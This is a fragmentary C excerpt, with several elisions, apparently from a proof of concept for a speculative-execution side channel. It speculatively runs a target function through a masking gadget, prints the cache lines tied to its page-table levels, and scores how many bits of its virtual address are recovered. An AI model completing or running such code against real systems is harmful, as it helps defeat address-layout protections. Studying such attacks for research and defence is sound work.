...
uint64_t trigger(uint64_t target, uint64_t phase, uint64_t __trash) {
  if (phase) {
    unmasked_gadget(signal_function, ~0x7fff000000000000,
                    0); // Speculatively execute signal_function
  }
  return __trash;
}
...
int main(void) {
  ...
  fprintf(stderr,
          ...
          "%lu\n",
          (uint64_t)signal_function,
          VPN4_TO_CACHE_LINE((uint64_t *)signal_function),
          VPN3_TO_CACHE_LINE((uint64_t *)signal_function),
          VPN2_TO_CACHE_LINE((uint64_t *)signal_function),
          VPN1_TO_CACHE_LINE((uint64_t *)signal_function),
          PO_TO_CACHE_LINE((uint64_t *)signal_function));
  fprintf(stderr, "\n\n\n");
  ...
  // Stats
  int correct_bits = bit_accuracy_checker(ans.va.va, (uint64_t)signal_function);
  fprintf(stderr,
